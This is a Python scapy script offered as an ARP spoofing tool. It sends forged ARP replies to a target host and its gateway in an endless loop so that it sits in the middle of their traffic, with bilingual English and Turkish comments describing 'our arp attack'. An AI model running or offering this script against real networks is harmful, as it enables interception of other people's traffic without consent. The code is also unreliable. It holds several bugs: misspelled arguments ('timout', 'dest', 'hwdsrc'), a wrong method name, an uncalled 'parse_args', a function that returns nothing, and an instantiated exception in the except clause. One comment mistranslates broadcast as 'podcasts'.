import scapy.all as scapy
import time
import optparse
def get_macaddress(ip):
    arp_request_packet = scapy.ARP(pdst=ip)#First, we create arp request packets for our target network.--Öncelikle hedef ağımız için arp istek paketleri oluşturuyoruz
    #scapy.ls(scapy.ARP())
    arp_brodcast_packet = scapy.Ether(dest = "ff:ff:ff:ff:ff:ff")#We create broadcast packages to make podcasts.--Podcast yapmak için yayın paketleri oluşturuyoruz.
    #scapy.ls(scapy.Ether())
    combined_packet = arp_brodcast_packet/arp_request_packet#Combining broadcast packages and request packets with the "/" sign to get a combined packet.--Birleşik bir paket elde etmek için yayın paketlerini ve istek paketlerini "/" işaretiyle birleştirmek.
    
    answered_list = scapy.srp(combined_packet,timout=1,verbose=False)[0]#We save the responses from scapy.srp--Scapy.srp'den gelen yanıtlar kaydediyoruz
    return answered_list[0][1].hwdsrc#From the information obtained as a result of the function, we only get the mac address.--Fonksiyonun bir sonucu olarak elde edilen bilgilerden sadece mac adresini alıyoruz.
    

def get_user_input():
    opt_parse = optparse.OptionParser()
   
    opt_parse.add_option("-t", "--target", dest="target_ip", help="enter the target ip")
    opt_parse.add_options("-g", "--gateway",dest="gateway_ip", help="enter the ggateway ip")
    
    options = opt_parse.parse_args[0]
    
    if not options.target_ip:
        print("Enter Target ip")
    if not options.gateway_ip:
        print("Enter the Gateway ip")
def reset_operation(fooled_ip,gateway_ip):

    fooled_mac = get_macaddress(fooled_ip)
    gateway_mac = get_macaddress(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)
    
    
    
def arp_poising(target_ip, poisened_ip):
    target_mac = get_macaddress(target_ip)#We call the get_mac_address function to find the mac address of the target ip.--Hedef ipin mac adresini bulmak için get_macaddress işlevini çağırıyoruz.
    arp_scope = scapy.ARP(op=2, pdst= target_ip, hwdst=target_mac, psrc = poisened_ip )#In the scapy ARP function, we make op 2 in the properties and in this way we create a response, not a request.--Scapy ARP fonksiyonunda, özelliklerde op 2 yapıyoruz ve bu şekilde bir istek değil bir yanıt oluşturuyoruz.
    scapy.send(arp_scope,verbose=False)#We send the packages created with the scapy.send function to the destinations.--Scapy.send fonksiyonu ile oluşturulan paketleri hedeflere gönderiyoruz.
number=0   

usr_ips = get_user_input()
user_target_ip = usr_ips.target_ip
user_gateway_ip = usr_ips.gateway_ip
 



try:
    while True:#We don't want our arp attack to end by sending only one packet, so we put it in an infinite loop.--Arp saldırımızın sadece bir paket göndererek bitmesini istemiyoruz, bu yüzden onu sonsuz bir döngüye koyuyoruz.
        arp_poising(user_target_ip,user_gateway_ip)
        arp_poising(user_gateway_ip, user_target_ip)
        time.sleep(3)
        number+=2
        print("\rSending Packet" + str(number), end="")
except KeyboardInterrupt():
    print("\nQuit")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)
    